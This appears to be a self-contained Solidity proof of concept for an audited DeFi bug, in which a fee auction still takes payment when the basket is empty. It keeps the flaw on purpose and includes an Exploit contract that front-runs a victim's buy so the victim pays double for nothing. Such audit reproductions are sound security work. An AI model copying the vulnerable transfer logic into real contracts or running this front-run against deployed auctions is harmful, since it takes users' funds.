// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  CAP Labs FeeAuction — a buy of an empty basket still takes payment
    (Trail of Bits, finding 61536). SYNTHETIC, cheatcode-free.
    _transferOutAssets skips a zero balance instead of reverting. A front-run
    buy takes the whole basket and doubles the next price. The victim then
    pays 200 and receives 0. Vulnerable line preserved (@> VULN). */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Treasury {}

contract FeeAuction {
    MockToken public paymentToken;
    address public paymentRecipient;
    uint256 public startPrice;
    uint256 public zeroAssetPaid;

    constructor(MockToken pay, address recipient, uint256 price) {
        paymentToken = pay;
        paymentRecipient = recipient;
        startPrice = price;
    }

    function buy(address[] calldata assets, address receiver) external {
        uint256 price = startPrice;
        uint256 sent = _transferOutAssets(assets, receiver);
        paymentToken.transferFrom(msg.sender, paymentRecipient, price);
        startPrice = price * 2; // S3 next auction starts at double
        if (sent == 0) _noteEmpty(price);
    }

    function buyFixed(address[] calldata assets, address receiver) external {
        uint256 price = startPrice;
        uint256 sent = _transferOutAssets(assets, receiver);
        require(sent > 0, "zero assets");
        paymentToken.transferFrom(msg.sender, paymentRecipient, price);
        startPrice = price * 2;
    }

    function _transferOutAssets(address[] calldata _assets, address _receiver) internal returns (uint256 total) {
        uint256 assetsLength = _assets.length;
        for (uint256 i; i < assetsLength; ++i) {
            address asset = _assets[i];
            uint256 bal = IERC20(asset).balanceOf(address(this));
            if (bal > 0) IERC20(asset).transfer(_receiver, bal); // @> VULN: a zero balance is skipped, so the buy still pulls payment
            // FIX: require(bal > 0) before accepting payment
            total += bal;
        }
    }

    function _noteEmpty(uint256 price) internal {
        zeroAssetPaid += price; // S6 victim paid this price and received nothing
    }
}

contract Victim {
    function approve(MockToken pay, address spender) external {
        pay.approve(spender, type(uint256).max);
    }

    function buy(FeeAuction auction, MockToken asset) external {
        address[] memory assets = new address[](1);
        assets[0] = address(asset);
        auction.buy(assets, address(this)); // S5
    }
}

contract Exploit {
    MockToken public pay; // nonce 1
    MockToken public asset; // nonce 2
    Treasury public treasury; // nonce 3
    FeeAuction public auction; // nonce 4
    Victim public victim; // nonce 5

    constructor() {
        pay = new MockToken();
        asset = new MockToken();
        treasury = new Treasury();
        auction = new FeeAuction(pay, address(treasury), 100 ether);
        victim = new Victim();
        asset.mint(address(auction), 1000 ether);
        pay.mint(address(this), 100 ether);
        pay.mint(address(victim), 200 ether);
        pay.approve(address(auction), type(uint256).max);
        victim.approve(pay, address(auction));
    }

    function run() external {
        address[] memory assets = new address[](1);
        assets[0] = address(asset);
        auction.buy(assets, address(this)); // S1
        victim.buy(auction, asset); // S4
        require(asset.balanceOf(address(this)) == 1000 ether, "attacker took the basket");
        require(asset.balanceOf(address(victim)) == 0, "victim received nothing");
        require(auction.zeroAssetPaid() == 200 ether, "victim paid double for zero");
        require(pay.balanceOf(address(victim)) == 0, "victim payment gone");
        require(pay.balanceOf(address(treasury)) == 300 ether, "both payments taken");
        require(auction.startPrice() == 400 ether, "price doubled twice");
    }
}
